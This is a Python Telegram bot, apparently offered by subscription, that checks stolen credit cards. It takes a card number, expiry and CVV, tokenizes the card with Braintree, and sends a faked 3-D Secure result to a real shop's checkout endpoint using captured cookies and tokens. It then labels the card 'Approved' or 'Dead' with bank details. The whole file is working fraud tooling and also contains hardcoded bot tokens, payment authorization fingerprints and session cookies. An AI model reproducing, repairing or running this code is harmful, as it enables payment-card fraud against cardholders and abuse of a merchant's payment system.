import time

import telebot,requests,re

from telebot.types import InlineKeyboardButton,InlineKeyboardMarkup,Message

from threading import Timer



app = telebot.TeleBot(token='6531089277:AAGMFJzwW4vVXxKAAccIrECNqknGpGoLGFw')

allowed_users = [1667594079, 5145264491, 5696557432]
allowed_groups = [-1001933244351, -1001822193078, -1001984700820]


last_command_time = {}

mem = {}






@app.message_handler(commands=['chk'])

def chkk(m: Message):
    

    if m.from_user.id in last_command_time and time.time() - last_command_time[m.from_user.id] < 50:
        a = app.send_message(m.chat.id, text='ANTI_SPAM: Try again after 50 seconds.', reply_to_message_id=m.id)
        return



    if m.from_user.id not in allowed_users and m.chat.id not in allowed_groups:
        app.send_message(m.chat.id, text='لا يمكنك استخدام هذا الأمر هنا يجب عليك تفعيل اشتراك للفحص هنا للاشتراك تواصل مع مطور البوت { @x6f_0 } .')
        return
    
      
    ccc = m.text.split('/chk ')[1]
    ff = re.findall(r'\b(\d{15}|\d{16})\|(\d{2}|\d{4})\|(\d{4}|\d{2})\|(\d{4}|\d{3})', ccc) or re.findall(r'\b(\d{15}|\d{16}) (\d{2})/(\d{4}|\d{2}) (\d{4}|\d{3})', ccc)

    if not ff:
        app.send_message(m.chat.id, text='الرجاء إدخال تنسيق صحيح لرقم البطاقة.')
        return
    
    f = ff[0]
    print(f)
    t = time.time()
    c = f[0]
    print(c)
    mm = str(f[1])
    y = f[2]
    cv = f[3]
    cc = c+'|'+mm+'|'+y+'|'+cv
    
    last_command_time[m.from_user.id] = time.time()

    
    a = app.send_message(m.chat.id, text='**Please Wait ...**', reply_to_message_id=m.id, parse_mode='markdown')
        
  
    def key():

        headers = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en,en-US;q=0.9,ar;q=0.8',
            'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2OTA0Njc0NTIsImp0aSI6ImJiNjM3NWExLWZkMTgtNDYyNy04ZTg5LWZjMzljZWE0OGVkZCIsInN1YiI6ImtoanRueHFzZndweXlwcHgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImtoanRueHFzZndweXlwcHgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.WfeQyMnyQc51kgAX6lEzA_v5SdVjHnZvQho_D8tVv9aQoA7X_bOjNbQddUPcbTexJ6xVw_nIUAfLqq1mzCedIg',
            'Braintree-Version': '2018-05-10',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Length': '782',
            'Content-Type': 'application/json',
            'Host': 'payments.braintree-api.com',
            'Origin': 'https://assets.braintreegateway.com',
            'Pragma': 'no-cache',
            'Referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        }

        json_data = {"clientSdkMetadata": {"source": "client", "integration": "dropin2",
                                           "sessionId": "8535aa2e-d924-4f4d-8756-26fb1ce0bd72"},
                     "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
                     "variables": {"input": {
                         "creditCard": {"number": c, "expirationMonth": mm, "expirationYear": y,
                                        "cvv": cv, "cardholderName": "jhd hgf"}, "options": {"validate": "false"}}},
                     "operationName": "TokenizeCreditCard"}

        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        aa = response.json()['data']['tokenizeCreditCard']['token']
        return aa
    print(key())
    url = f'https://api.braintreegateway.com/merchants/khjtnxqsfwpyyppx/client_api/v1/payment_methods/{key()}/three_d_secure/lookup'

    head = {
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en,en-US;q=0.9,ar;q=0.8',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Length': '1673',
        'Content-Type': 'application/json',
        'Host': 'api.braintreegateway.com',
        'Origin': 'https://www.devonhampers.com',
        'Pragma': 'no-cache',
        'Referer': 'https://www.devonhampers.com/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    }

    data = {"amount": "99.95", "additionalInfo": {"shippingGivenName": "drjhyhjghdjhfjh", "shippingSurname": "dfdfdf",
                                                  "acsWindowSize": "03", "billingLine1": "137 Vesey St",
                                                  "billingLine2": "", "billingCity": "Brockton", "billingState": "MA",
                                                  "billingPostalCode": "02301-6532", "billingCountryCode": "US",
                                                  "billingGivenName": "drjhyhjghdjhfjh", "billingSurname": "dfdfdf",
                                                  "shippingLine1": "71 High Street", "shippingLine2": "",
                                                  "shippingCity": "Aberlour", "shippingState": "",
                                                  "shippingPostalCode": "AB38 9QB", "shippingCountryCode": "GB",
                                                  "email": "tooluool2@gmail.com"}, "bin": "476972",
            "dfReferenceId": "1_19c004fa-2e4d-4bc1-bd9c-df6d48f8d1fe",
            "clientMetadata": {"requestedThreeDSecureVersion": "2", "sdkVersion": "web/3.85.2",
                               "cardinalDeviceDataCollectionTimeElapsed": 3565,
                               "issuerDeviceDataCollectionTimeElapsed": 1592,
                               "issuerDeviceDataCollectionResult": "true"},
            "authorizationFingerprint": "eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2OTA0Njc0NTIsImp0aSI6ImJiNjM3NWExLWZkMTgtNDYyNy04ZTg5LWZjMzljZWE0OGVkZCIsInN1YiI6ImtoanRueHFzZndweXlwcHgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImtoanRueHFzZndweXlwcHgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.WfeQyMnyQc51kgAX6lEzA_v5SdVjHnZvQho_D8tVv9aQoA7X_bOjNbQddUPcbTexJ6xVw_nIUAfLqq1mzCedIg",
            "braintreeLibraryVersion": "braintree/web/3.85.2",
            "_meta": {"merchantAppId": "www.devonhampers.com", "platform": "web", "sdkVersion": "3.85.2",
                      "source": "client", "integration": "custom", "integrationType": "custom",
                      "sessionId": "8535aa2e-d924-4f4d-8756-26fb1ce0bd72"}}

    req = requests.post(url, headers=head, json=data).json()

    # ===== المتطلبات =======
    y = req['paymentMethod']
    print(y)
    nonce = y['nonce']
    acsUrl = y['threeDSecureInfo']['acsUrl']
    cavv = y['threeDSecureInfo']['cavv']
    xid = y['threeDSecureInfo']['xid']
    acsTransactionId = y['threeDSecureInfo']['acsTransactionId']
    dsTransactionId = y['threeDSecureInfo']['dsTransactionId']
    threeDSecureAuthenticationId = y['threeDSecureInfo']['threeDSecureAuthenticationId']
    threeDSecureServerTransactionId = y['threeDSecureInfo']['threeDSecureServerTransactionId']
    issuingBank = y['binData']['issuingBank']
    countryOfIssuance = y['binData']['countryOfIssuance']
    productId = y['binData']['productId']
    cardType = y['details']['cardType']
    lastTwo = y['details']['lastTwo']
    lastFour = y['details']['lastFour']
    status = y['threeDSecureInfo']['status']
    a = app.edit_message_text(chat_id=m.chat.id, text='**Waiting for result...**', message_id=a.id, parse_mode='markdown')

    data = {
        'nonce': nonce,
        'details[cardholderName]': 'jhd hgf',
        'details[expirationMonth]': '02',
        'details[expirationYear]': '2026',
        'details[bin]': '',
        'details[cardType]': cardType,
        'details[lastFour]': lastFour,
        'details[lastTwo]': lastTwo,
        'type': 'CreditCard',
        'description': y['description'],
        'liabilityShifted': 'true',
        'liabilityShiftPossible': 'true',
        'threeDSecureInfo[liabilityShifted]': 'true',
        'threeDSecureInfo[liabilityShiftPossible]': 'true',
        'threeDSecureInfo[status]': status,
        'threeDSecureInfo[enrolled]': 'Y',
        'threeDSecureInfo[cavv]': cavv,
        'threeDSecureInfo[xid]': xid,
        'threeDSecureInfo[acsTransactionId]': acsTransactionId,
        'threeDSecureInfo[dsTransactionId]': dsTransactionId,
        'threeDSecureInfo[eciFlag]': '06',
        'threeDSecureInfo[acsUrl]': acsUrl,
        'threeDSecureInfo[paresStatus]': 'A',
        'threeDSecureInfo[threeDSecureAuthenticationId]': threeDSecureAuthenticationId,
        'threeDSecureInfo[threeDSecureServerTransactionId]': threeDSecureServerTransactionId,
        'threeDSecureInfo[threeDSecureVersion]': '2.2.0',
        'threeDSecureInfo[lookup][transStatus]': 'A',
        'threeDSecureInfo[lookup][transStatusReason]': '',
        'threeDSecureInfo[authentication][transStatus]': '',
        'threeDSecureInfo[authentication][transStatusReason]': '',
        'binData[prepaid]': 'Yes',
        'binData[healthcare]': 'No',
        'binData[debit]': 'Yes',
        'binData[durbinRegulated]': 'No',
        'binData[commercial]': 'Unknown',
        'binData[payroll]': 'No',
        'binData[issuingBank]': issuingBank,
        'binData[countryOfIssuance]': countryOfIssuance,
        'binData[productId]': productId,
    }

    head = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en,en-US;q=0.9,ar;q=0.8',
        'cache-control': 'no-cache',
        'content-length': '1565',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'cookie': 'shopping_cart=0d837a19d6f17693239d1bc6effbf28a4b5029f1; sib_cuid=be542364-d97a-4470-a106-22ae92ea6b93; _fbp=fb.1.1690378324609.225278725; cookie-preferences=%7B%22analytics%22%3Atrue%2C%22marketing%22%3Atrue%2C%22social%22%3Atrue%7D; _gid=GA1.2.412727794.1690378419; PHPSESSID=7d7sp1sacnqbkn9qmrr4q7dia4; VPKSignature=79a4b10a196873eb992cc04e6192196961552b5934ae90ed923d0e8efe2e3faa; _ga=GA1.1.1615518238.1690378377; _ga_MSRHC1JGEM=GS1.1.1690378377.1.1.1690381056.0.0.0; _ga_403CTY0H61=GS1.2.1690378426.1.1.1690381057.0.0.0; _uetsid=c9b0e6402bb811ee811e75811bffe2a4; _uetvid=c9b136702bb811eebdd7f75d5f6acafb',
        'origin': 'https://www.devonhampers.com',
        'pragma': 'no-cache',
        'referer': 'https://www.devonhampers.com/checkout/pay/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    reqq = requests.post('https://www.devonhampers.com/checkout/callback/?method=braintree&oid=131972', headers=head,
                         data=data).json()
    match = reqq['url'].split('?error=')[1].split('&')[0].replace('+', ' ')
    
    
    
    api = requests.get(f'https://lookup.binlist.net/{c[:6]}').json()
    try:
        chh = api['scheme']
        ch = chh.upper()
    except:
        ch = 'False'
    try:
        typ = api['type']
        type = typ.upper()
    except:
        type = 'False'
    try:
        raa = api['brand']
        ra = raa.upper()
    except:
        ra = 'False'
    try:
        am = api['bank']['name']
        ame = am.upper()
    except:
        ame = 'False'
    try:
        co = api['country']['name']
        cou = co
    except:
        cou = 'False'
    try:
        emoji = api['country']['emoji']
    except:
        emoji = 'False'
    tt = time.time()
    d = tt - t
    timer = round(d,2)
    if 'Insufficient Funds' in match:
        matchh = match
        me = f'''<strong>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅ 
- - - - - - - - - - - - - - - - - - - - - - -
CC -> <code>{cc}</code>
Gateway -> Braintree Auth
Response -> Approved
- - - - - - - - - - - - - - - - - - - - - - -
Bin -> {cc[:6]}
Bin Info -> {ch} - {type} - {ra}
Bank -> {ame}
Counrty -> {cou} {emoji}
- - - - - - - - - - - - - - - - - - - - - - -
Dev : <a href="https://t.me/x6f_0" target="_blank">BESON .</a>
Taken {timer} secounds .</strong>
        '''
        app.edit_message_text(chat_id=m.chat.id, text=me, parse_mode='html', message_id=a.id, disable_web_page_preview=True)
    elif 'Processor Declined - Fraud Suspected' in match:
        me = f'''<strong>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅ 
- - - - - - - - - - - - - - - - - - - - - - -
CC -> <code>{cc}</code>
Gateway -> Braintree Auth
Response -> Approved
- - - - - - - - - - - - - - - - - - - - - - -
Bin -> {cc[:6]}
Bin Info -> {ch} - {type} - {ra}
Bank -> {ame}
Counrty -> {cou} {emoji}
- - - - - - - - - - - - - - - - - - - - - - -
Dev : <a href="https://t.me/x6f_0" target="_blank">BESON .</a>
Taken {timer} secounds .</strong>
        '''


        
        app.edit_message_text(chat_id=m.chat.id, text=me, parse_mode='html', message_id=a.id, disable_web_page_preview=True)
    elif 'three_d_secure' in match:
        me = f'''<strong>Dead Card ❌
- - - - - - - - - - - - - - - - - - - - - - -
CC -> <code>{cc}</code>
Gateway -> Braintree Auth
Response -> 𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌ .
- - - - - - - - - - - - - - - - - - - - - - -
Bin -> {cc[:6]}
Bin Info -> {ch} - {type} - {ra}
Bank -> {ame}
Counrty -> {cou} {emoji}
- - - - - - - - - - - - - - - - - - - - - - -
Dev : <a href="https://t.me/x6f_0" target="_blank">BESON .</a>
Taken {timer} secounds .</strong>
                '''
        app.edit_message_text(chat_id=m.chat.id, text=me, parse_mode='html', message_id=a.id,
                              disable_web_page_preview=True)
    elif 'payment_method_nonce' in match:
        me = '''<strong>ERROR:Try Again .</strong>'''
        app.edit_message_text(chat_id=m.chat.id, text=me, parse_mode='html', message_id=a.id,
                              disable_web_page_preview=True)
    elif match =='':
        me = '''<strong>Invaild Response .</strong>'''
        app.edit_message_text(chat_id=m.chat.id, text=me, parse_mode='html', message_id=a.id, disable_web_page_preview=True)
        exit()
    else:
        matchh = match
        me = f'''<strong>Dead Card ❌
- - - - - - - - - - - - - - - - - - - - - - -
CC -> <code>{cc}</code>
Gateway -> Braintree Auth
Response -> {matchh} .
- - - - - - - - - - - - - - - - - - - - - - -
Bin -> {cc[:6]}
Bin Info -> {ch} - {type} - {ra}
Bank -> {ame}
Counrty -> {cou} {emoji}
- - - - - - - - - - - - - - - - - - - - - - -
Dev : <a href="https://t.me/x6f_0" target="_blank">BESON .</a></strong>
𝗧𝗼𝗼𝗸 {timer} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
'''
        app.edit_message_text(chat_id=m.chat.id, text=me, parse_mode='html', message_id=a.id, disable_web_page_preview=True)
    time.sleep(50)   
app.infinity_polling()
## @p_source